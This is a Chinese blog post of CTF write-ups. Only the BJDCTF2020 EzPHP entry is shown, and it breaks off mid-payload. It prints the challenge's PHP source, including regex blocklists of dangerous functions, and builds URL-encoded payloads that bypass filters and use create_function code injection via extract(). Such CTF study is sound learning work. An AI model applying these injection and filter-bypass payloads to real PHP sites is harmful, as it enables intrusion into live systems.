<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-trophy-1.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-trophy-1.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"www.z1d10t.fun","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"show_result":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="buu刷题(page 4)">
<meta property="og:type" content="article">
<meta property="og:title" content="buu刷题(page 4)">
<meta property="og:url" content="https://www.z1d10t.fun/post/ec342723.html">
<meta property="og:site_name" content="Z1d10tのBlog">
<meta property="og:description" content="buu刷题(page 4)">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688899385264-4f64aa94-f527-4470-9bca-c3ff249a256f.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688901679744-d25e859e-d14a-49fc-949b-1f84172e40c4.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688966691744-0ff8bc5e-3bdc-4fe4-9f4b-60e708c4cffd.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688966946619-d0ce7ed6-e9a6-4c4d-96e9-5c89b18aed89.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688972164206-c84c4d71-7af7-405f-ab58-7a01382d8a3d.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688972249693-0b95cade-1ab0-4116-a842-d40fec4f9ff3.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688973469139-4b68991a-fe08-469e-b040-80f76f3dbe3c.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688973625307-c62c6cd1-194d-4b26-b8f8-ae282d9cc448.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688981688423-219797d3-2ce2-4788-a4df-421375f019df.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688981793987-aa46eb16-b193-4fe8-932f-6cf3d7f8b04b.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688981807209-791e4185-75c6-437e-8e08-04ae2b6fe628.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688981987225-574481c1-124f-4461-95da-7c07b5565c7e.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688982259213-467c161b-a461-43d4-907c-dc982a85a45a.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688982237616-df436f24-2567-4a63-83df-8ee981b28a72.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689042712077-67edce38-b96a-444a-bce5-62b0f91350dc.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689042755534-7ce030d7-56c5-4055-8095-8ec62023fbb5.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689045182635-356c24fb-2eef-4543-a0b8-69d47c40d71c.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689144943353-7aeef221-d563-4b1f-a3f6-ce3aeaa1786e.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689145004564-d20d1342-c322-450b-aa7f-c6e7959abc28.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689146550618-3a5f2ae6-340b-42f9-b327-afe4657204bb.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689146577763-dce5b8bf-979b-4f0e-8204-c5e26913b88d.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689149395750-95a55a53-b147-4d9c-86e3-e1c4b5782c95.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689149481560-7cacba81-1c98-408b-b818-fcafa4800307.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689155122030-02f4658e-9dee-4cad-9574-9990289024e7.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689156469993-1fe293bf-0731-4bb9-afa1-1baea4c66837.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689156517393-2b00eb8d-8b8f-483c-bd18-6283d478d58c.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689156526111-41289877-d5fe-43b4-995b-8a5c3c2fe4c0.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689246050444-e2bd3402-2a56-4bfb-a11a-4fc596dab0f3.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689247105099-87f2d3e4-1a74-4363-a461-6001c373d7c0.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689248080086-9b602508-dccd-4faa-91e1-1503e8ef5b58.png">
<meta property="article:published_time" content="2023-07-13T14:12:53.000Z">
<meta property="article:modified_time" content="2023-07-20T06:08:25.963Z">
<meta property="article:author" content="Z1d10t">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688899385264-4f64aa94-f527-4470-9bca-c3ff249a256f.png">


<link rel="canonical" href="https://www.z1d10t.fun/post/ec342723.html">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://www.z1d10t.fun/post/ec342723.html","path":"post/ec342723.html","title":"buu刷题(page 4)"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>buu刷题(page 4) | Z1d10tのBlog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Z1d10tのBlog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description"> </p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-house fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tag fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-rectangle-list fa-fw"></i>分类</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>博主</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#98%E3%80%81-BJDCTF2020-EzPH"><span class="nav-number">1.</span> <span class="nav-text">98、[BJDCTF2020]EzPH</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#99%E3%80%81October-2019-Twice-SQL-Injectio"><span class="nav-number">2.</span> <span class="nav-text">99、October 2019 Twice SQL Injectio</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#100%E3%80%81-HFCTF2020-JustEscape"><span class="nav-number">3.</span> <span class="nav-text">100、[HFCTF2020]JustEscape</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#101%E3%80%81-GXYCTF2019-StrongestMind"><span class="nav-number">4.</span> <span class="nav-text">101、[GXYCTF2019]StrongestMind</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#102%E3%80%81-SUCTF-2018-GetShell"><span class="nav-number">5.</span> <span class="nav-text">102、[SUCTF 2018]GetShell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#103%E3%80%81-GKCTF-2021-easycms"><span class="nav-number">6.</span> <span class="nav-text">103、[GKCTF 2021]easycms</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#104%E3%80%81-b01lers2020-Life-on-Mars"><span class="nav-number">7.</span> <span class="nav-text">104、[b01lers2020]Life on Mars</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#105%E3%80%81-MRCTF2020-Ezaudit"><span class="nav-number">8.</span> <span class="nav-text">105、[MRCTF2020]Ezaudit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#106%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp1-Welcome"><span class="nav-number">9.</span> <span class="nav-text">106、[极客大挑战 2020]Roamphp1-Welcome</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#107%E3%80%81-WMCTF2020-Make-PHP-Great-Again"><span class="nav-number">10.</span> <span class="nav-text">107、[WMCTF2020]Make PHP Great Again</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#108%E3%80%81-CSAWQual-2019-Web-Unagi"><span class="nav-number">11.</span> <span class="nav-text">108、[CSAWQual 2019]Web_Unagi</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#109%E3%80%81-SCTF2019-Flag-Shop"><span class="nav-number">12.</span> <span class="nav-text">109、[SCTF2019]Flag Shop</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#110%E3%80%81-GYCTF2020-Easyphp"><span class="nav-number">13.</span> <span class="nav-text">110、[GYCTF2020]Easyphp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#111%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Greatphp"><span class="nav-number">14.</span> <span class="nav-text">111、[极客大挑战 2020]Greatphp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#112%E3%80%81EasyBypass"><span class="nav-number">15.</span> <span class="nav-text">112、EasyBypass</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Z1d10t"
      src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blogavatar.jpg">
  <p class="site-author-name" itemprop="name">Z1d10t</p>
  <div class="site-description" itemprop="description">这是什么动物，这是废物</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">77</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">82</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.z1d10t.fun/post/ec342723.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blogavatar.jpg">
      <meta itemprop="name" content="Z1d10t">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Z1d10tのBlog">
      <meta itemprop="description" content="这是什么动物，这是废物">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="buu刷题(page 4) | Z1d10tのBlog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          buu刷题(page 4)
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-07-13 22:12:53" itemprop="dateCreated datePublished" datetime="2023-07-13T22:12:53+08:00">2023-07-13</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-07-20 14:08:25" itemprop="dateModified" datetime="2023-07-20T14:08:25+08:00">2023-07-20</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/buuctf/" itemprop="url" rel="index"><span itemprop="name">buuctf</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <p>buu刷题(page 4)</p>
<span id="more"></span>

<h1 id="98、-BJDCTF2020-EzPH"><a href="#98、-BJDCTF2020-EzPH" class="headerlink" title="98、[BJDCTF2020]EzPH"></a>98、[BJDCTF2020]EzPH</h1><p>查看源码发现一段base32码<code>GFXEIM3YFZYGQ4A=</code> 特征是只有大写字母和数字</p>
<p>解码获得<code>/1nD3x.php</code></p>
<p>源码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;1nD3x.php&quot;</span>;</span><br><span class="line"><span class="variable">$shana</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shana&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">sha1</span>(<span class="variable">$shana</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || </span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>和一个正则已经不可能让我们输入合法了，所以要想办法绕过这个<code>$_SERVER[&#39;QUERY_STRING&#39;]</code></p>
<p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>不对传入的东西进行url编码，所以我们可以进行全字符url编码后传入就可以bypass。</p>
<p>然后是经典的换行符<code>%0a</code>绕过<code>preg_match(&#39;/^aqua_is_cute$/&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !== &#39;aqua_is_cute&#39;) </code></p>
<p><code>file_get_contents($file) !== &#39;debu_debu_aqua&#39;</code>利用data协议写入即可</p>
<p><code>sha1()</code>和md5一样我们传入两个数组就会报false 从而bypass</p>
<p><code>$_REQUEST</code>它包含了我们get、post和cookie传入的数组，他ban掉了数字和大小写，那这里应该怎么绕过呢。</p>
<p> 如果get和post一样的参数名，它会优先选择post形式传入的参数的值。</p>
<p>所以我们可以按他的要求get传入，然后再post相同的变量名传参为数字，那么就可以bypass了</p>
<p>至此，我们要传入的部分为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,debu_debu_aqua&amp;debu=aqua_is_cute%0a&amp;shana[]=1&amp;passwd[]=2</span><br></pre></td></tr></table></figure>

<p>通过url编码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2</span><br></pre></td></tr></table></figure>

<p>这里注意一下这里符号以及数字没有被waf所以不要一键url编码了 数字和符号原样放出即可 如果一起编码，解码的时候就会出现歧义</p>
<p>再来看<code>extract()</code>简单说就是当我们传入一个含有键值对的数组时候，他就会帮我们把键值分别提出来键为变量名，值为变量的值。 </p>
<p>再来看<code>$code(&#39;&#39;, $arg)</code>这一部分，这里我们可以利用前面的extract()来改变他们的值从而利用</p>
<p>这里用到了create_function()匿名函数注入，之前ctfshow刷题也见到过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$myfunc</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="string">&#x27;return $a+$b;&#x27;</span>);</span><br><span class="line">相当于</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myfunc</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span>+<span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line">利用sql注入的闭合思想</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">myfunc</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$a</span>+<span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>();<span class="comment">//&#125;</span></span><br><span class="line">我们可以闭合前面的&#123; 然后注释掉后面的 &#125;  再插入我们的恶意代码</span><br></pre></td></tr></table></figure>

<p>因此我们可以利用extract传参：<code>flag[code]=create_function&amp;flag[arg]=;&#125;var_dump(get_defined_vars());//</code></p>
<p>获取当前所有变量数组</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">?file=%<span class="number">64</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">61</span>%<span class="number">3</span>a%<span class="number">2</span>f%<span class="number">2</span>f%<span class="number">74</span>%<span class="number">65</span>%<span class="number">78</span>%<span class="number">74</span>%<span class="number">2</span>f%<span class="number">70</span>%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">69</span>%<span class="number">6</span>e%<span class="number">2</span>c%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>%<span class="number">5</span>f%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>%<span class="number">5</span>f%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>&amp;%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>=%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>%<span class="number">5</span>f%<span class="number">69</span>%<span class="number">73</span>%<span class="number">5</span>f%<span class="number">63</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">0</span>a&amp;%<span class="number">73</span>%<span class="number">68</span>%<span class="number">61</span>%<span class="number">6</span>e%<span class="number">61</span>[]=<span class="number">1</span>&amp;%<span class="number">70</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">77</span>%<span class="number">64</span>[]=<span class="number">2</span>&amp;%<span class="number">66</span>%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">67</span>[%<span class="number">63</span>%<span 